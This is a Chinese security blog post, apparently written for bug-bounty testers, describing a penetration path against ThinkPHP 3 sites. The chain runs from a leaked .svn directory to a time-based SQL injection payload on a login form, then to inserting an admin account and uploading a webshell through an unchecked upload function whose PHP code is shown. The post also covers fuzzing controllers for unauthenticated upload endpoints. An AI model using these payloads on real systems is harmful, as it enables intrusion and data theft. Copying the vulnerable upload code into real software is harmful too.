<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        leshier&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            TP3框架下的渗透思路
        </p>
        <hr>
    </div>
    <div class="post-content">
        <h2 id="1、-ThinkPHP"><a href="#1、-ThinkPHP" class="headerlink" title="1、 ThinkPHP"></a>1、 ThinkPHP</h2><p><code> ThinkPHP是一个开源免费的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。同时遵循Apache2开源许可协议发布，意味着你可以免费使用ThinkPHP，甚至允许把你基于ThinkPHP开发的应用开源或商业产品发布/销售</code> </p>
<p><code>ThinkPHP (TP)</code> 算是国内主流的一个PHP框架，首先上手快，资料多，学习成本很低，而且也是我第一个接触的MVC框架。</p>
<p>TP主要分为以下几个版本： <code>TP3</code> 、 <code>TP5</code> 、 <code>TP6</code> <br>大可能出现漏洞的范围，或者说常见的漏洞（肯定不全，一般的思路）：</p>
<ul>
<li>TP3<ul>
<li>SQLi</li>
</ul>
</li>
<li>TP5<ul>
<li>RCE</li>
</ul>
</li>
<li>TP6<ul>
<li>任意文件操作</li>
</ul>
</li>
</ul>
<p>由于 <code>TP</code> 是个国内较为主流的框架，在SRC或者众测中经常遇到基于 <code>TP</code>的业务系统，那么接下来，我会以案例讲解我渗透 <code>TP</code> 的思路。</p>
<h3 id="1-1-确定版本"><a href="#1-1-确定版本" class="headerlink" title="1.1 确定版本"></a>1.1 确定版本</h3><p>对于确定版本信息，一般可以在xxx/index.php/index/ <code>任意字符</code> <br>一般就会出现无法找到控制器的报错信息，就可以确定版本（如果没自定义错误页面的话）。</p>
<p><img src="/Users/leshier/GitHub_Blog/source/_posts/TP3_pentest//image-20201215185157124.png" alt="image-20201215185157124"></p>
<h2 id="2、案例1-SVN-gt-SQLi-gt-GetShell"><a href="#2、案例1-SVN-gt-SQLi-gt-GetShell" class="headerlink" title="2、案例1- .SVN -&gt; SQLi -&gt; GetShell"></a>2、案例1- <code>.SVN</code> -&gt; <code>SQLi</code> -&gt; <code>GetShell</code></h2><h3 id="2-1-SVN"><a href="#2-1-SVN" class="headerlink" title="2.1 .SVN"></a>2.1 .SVN</h3><p>在挖掘某SRC时，直接一个登陆界面，简单查看url为： <code>xxxx/index.php/Home/Login</code>  ，初步判定 <code>TP</code> 框架<br>随手加上 <code>.SVN</code>，403 ，稳了。 <code>SVN</code> 泄露，利用：<a target="_blank" rel="noopener" href="https://github.com/admintony/svnExploit/">https://github.com/admintony/svnExploit/</a> 把源码download下来：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603159630678-99d71a97-6bd6-41eb-a63c-5ef627cf85a9.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=902&originWidth=900&size=85574&status=done&style=none&width=450" alt="image.png"><br>某些关键字可能与SRC有关，因此隐去。</p>
<blockquote>
<p>├── Application  应用目录（一般前后台两个应用）<br>│   ├── Admin<br>│   │   ├── Action  控制器 （重要）<br>│   │   ├── Common<br>│   │   ├── Conf<br>│   │   ├── Model<br>│   │   ├── View<br>│   │   └── index.html<br>│   ├── Common （公共配置文件）</p>
</blockquote>
<blockquote>
<p>│   ├── Home</p>
</blockquote>
<blockquote>
<p>│   │   ├── Action 控制器（重要）</p>
</blockquote>
<blockquote>
<p>│   │   ├── Common</p>
</blockquote>
<blockquote>
<p>│   │   ├── Conf</p>
</blockquote>
<blockquote>
<p>│   │   ├── Model</p>
</blockquote>
<blockquote>
<p>│   │   ├── View</p>
</blockquote>
<blockquote>
<p>│   │   └── index.html</p>
</blockquote>
<blockquote>
<p>│   └── Lib   （库）</p>
</blockquote>
<blockquote>
<p>├── Public  公开资源，例如js，css，或者上传的image</p>
</blockquote>
<blockquote>
<p>│   ├── css</p>
</blockquote>
<blockquote>
<p>│   ├── font-awesome</p>
</blockquote>
<blockquote>
<p>│   └── js</p>
</blockquote>
<blockquote>
<p>├── ThinkPHP  TP的程序，只要看到版本就ok</p>
</blockquote>
<blockquote>
<p>│   ├── Common</p>
</blockquote>
<blockquote>
<p>│   ├── Conf</p>
</blockquote>
<blockquote>
<p>│   ├── LICENSE.txt</p>
</blockquote>
<blockquote>
<p>│   ├── Lang</p>
</blockquote>
<blockquote>
<p>│   ├── Library</p>
</blockquote>
<blockquote>
<p>│   ├── Mode</p>
</blockquote>
<blockquote>
<p>│   ├── ThinkPHP.php</p>
</blockquote>
<blockquote>
<p>│   ├── Tpl</p>
</blockquote>
<blockquote>
<p>│   └── logo.png</p>
</blockquote>
<blockquote>
<p>├── Uploads   在该SRC中，上传存放此处</p>
</blockquote>
<blockquote>
<p>│   ├── Uploads</p>
</blockquote>
<blockquote>
<p>│   └── files</p>
</blockquote>
<blockquote>
<p>├── index.html</p>
</blockquote>
<blockquote>
<p>├── index.php  入口文件</p>
</blockquote>
<p>其他没写出来的，不是不重要，是我一般不太看（大笑）。</p>
<h3 id="2-2-SQLi"><a href="#2-2-SQLi" class="headerlink" title="2.2  SQLi"></a>2.2  SQLi</h3><p>对于前台的话，我建议先看Home，因为这里的一般不需要登陆，没有鉴权。直接看登陆的方法<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603160773217-7ea241ab-f71e-44d9-974d-cd2f886b16ec.png#align=left&display=inline&height=625&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1250&originWidth=1834&size=254190&status=done&style=none&width=917" alt="image.png"><br>(有一些变量可能和SRC有关，就此用x代替)<br>很明显，x 存在SQLi</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload如下：</span><br><span class="line">POST /Home/Login/checkLogin.html HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Content-Length: 152</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">extension=xxx&amp;x[0]=exp&amp;x[1]==(select*from(select+sleep(5)union/**/select+1)a)&amp;password=xxxx</span><br></pre></td></tr></table></figure>
<p>当然sqlmap指定x是跑部出来的，需要对payload做些处理：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Content-Length: 152</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">extension=xxx&amp;x[0]=exp&amp;x[1]==(select from(*)a)&amp;password=xxxx</span><br></pre></td></tr></table></figure>
<p>ok，将一部分转换成*，sqlmap指定，就可以跑出来，盲注。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603193661767-5035759b-aaf7-4227-8c4e-597fbac60b17.png#align=left&display=inline&height=760&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1520&originWidth=1914&size=1308566&status=done&style=none&width=957" alt="image.png"></p>
<h3 id="2-3-Getshell"><a href="#2-3-Getshell" class="headerlink" title="2.3 Getshell"></a>2.3 Getshell</h3><p><code>TP</code> 的代码审计，我不想讲太多，对于TP3的话，我的建议是先找敏感函数吧。因为不是专门代码审计的文章，我们SQLi有了，账号密码盲注的话还是太慢了，当然我跑出来了，但是密码无法解出，没关系，我们源码都有了，直接找Getshell的点吧。<br>一般全局查找upload关键字：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603193917196-750260f2-f286-471a-b317-473faba08db8.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=image.png&originHeight=474&originWidth=842&size=72623&status=done&style=none&width=421" alt="image.png"><br>在这里的时候就发现，Admin应用下存在上传点：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603194062056-ab75c65d-5a26-4e74-b046-2e0df56320f4.png#align=left&display=inline&height=674&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1348&originWidth=2408&size=385725&status=done&style=none&width=1204" alt="image.png"><br>这里任意文件上传，已弃用，但是没删掉。黑人问号？？？？</p>
<p>注意第三行代码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class ManageAction extends BaseAction</span><br></pre></td></tr></table></figure>
<p>BaseAction 为权限控制类，那么这个控制器里的方法必须要登陆才可以访问。我们的SQLi虽然解不出来，但是可以插入新的数据，于是我插入了一条管理员的账号，成功登陆。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadPic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] != <span class="number">4</span>) &#123;</span><br><span class="line">           <span class="variable">$image_name</span> = time() . rand(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="string">&quot;.&quot;</span> . end(explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])); <span class="comment">//图片名称</span></span><br><span class="line">           move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./Uploads/images/login_pic/&#x27;</span> . <span class="variable">$image_name</span>); <span class="comment">//上传图片</span></span><br><span class="line">           <span class="variable">$data</span>[<span class="string">&#x27;pic_path&#x27;</span>] = <span class="string">&quot;/Uploads/images/login_pic/&quot;</span> . <span class="variable">$image_name</span>;</span><br><span class="line">           <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">           <span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = time();</span><br><span class="line">           M(<span class="string">&quot;login_pic&quot;</span>)-&gt;add(<span class="variable">$data</span>);</span><br><span class="line">           <span class="keyword">$this</span>-&gt;success(<span class="string">&quot;上传成功&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;error(<span class="string">&quot;上传失败&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>注意这一句： <code>$image_name = time() . rand(1000, 9999) . &quot;.&quot; . end(explode(&quot;.&quot;, $_FILES[&#39;pic&#39;][&#39;name&#39;])); //图片名称</code> <br>时间加随机数，可以爆破的，但是作为有代码有SQLi的咱们，并不需要那么复杂。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = time();</span><br><span class="line">M(<span class="string">&quot;login_pic&quot;</span>)-&gt;add(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
<p>他这里有将文件名路径插入数据库的操作，上传shell之后，直接去数据库查询即可。<br>Getshell：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603194444875-b2e81d73-827e-4c8e-9140-7adbf9a8826b.png#align=left&display=inline&height=760&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1520&originWidth=1914&size=1961366&status=done&style=none&width=957" alt="image.png"><br>当然这里还有个小问题，为了照顾新学习tp的童鞋，如何访问控制器里的方法：<br>一般是 <code>xxxxx/index.php/应用名称/控制器名/方法名</code> <br>在这里就是：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603194595905-008fd1eb-42f4-4e82-8435-ff9cf90f76a1.png#align=left&display=inline&height=264&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=562&size=82219&status=done&style=none&width=281" alt="image.png"><br><code>xxx/index.php/Admin/Manage/loginPic</code> 这个路径，当然，具体还是看tp是怎么配置的，一般是这样。在这里师傅们肯定发现，这种情况会有新的fuzz情况产生。</p>
<h2 id="3、案例2-Fuzz-TP方法。"><a href="#3、案例2-Fuzz-TP方法。" class="headerlink" title="3、案例2 Fuzz TP方法。"></a>3、案例2 Fuzz TP方法。</h2><p><code>xxx/index.php/Admin/Manage/loginPic</code><br>如果后台某些控制器权限控制不严格，可能会有未授权的产生，在这里可以对 <code>loginPic</code> 进行Fuzz。在挖掘某SRC时，就遇到这个情况，也是TP的框架，直接Fuzz方法（或者控制器名称都可）：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603194931450-064183ca-1b21-4dc6-a46d-5eb6a3068aab.png#align=left&display=inline&height=408&margin=%5Bobject%20Object%5D&name=image.png&originHeight=816&originWidth=1822&size=563509&status=done&style=none&width=911" alt="image.png"><br>这里没截到，当时fuzz出来一个upload控制器，然后就getshell咯<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603195020022-b8a95665-aaa4-4f00-84cf-dcc6ef7fa2cc.png#align=left&display=inline&height=327&margin=%5Bobject%20Object%5D&name=image.png&originHeight=654&originWidth=1804&size=669243&status=done&style=none&width=902" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1847471/1603195055409-5a5f70e6-f72f-43c0-8e41-f88471805afa.png#align=left&display=inline&height=390&margin=%5Bobject%20Object%5D&name=image.png&originHeight=780&originWidth=1880&size=820466&status=done&style=none&width=940" alt="image.png"></p>
<h2 id="4、结尾"><a href="#4、结尾" class="headerlink" title="4、结尾"></a>4、结尾</h2><p>现在TP框架挺常见，在SRC中，TP3的版本，相信各位老哥有各种各样的姿势。</p>
<p>我这就抛砖引玉一波。</p>

    </div>

    
</div>
    <div class="footer" id="footer">
    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <span id="busuanzi_container_site_pv">Site PV: <span id="busuanzi_value_site_pv"></span></span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv">Site UV: <span id="busuanzi_value_site_uv"></span></span>
    
    <p>Copyright © 2020 <a class="flink" href="#">Modified Geek by leshier</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
        
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>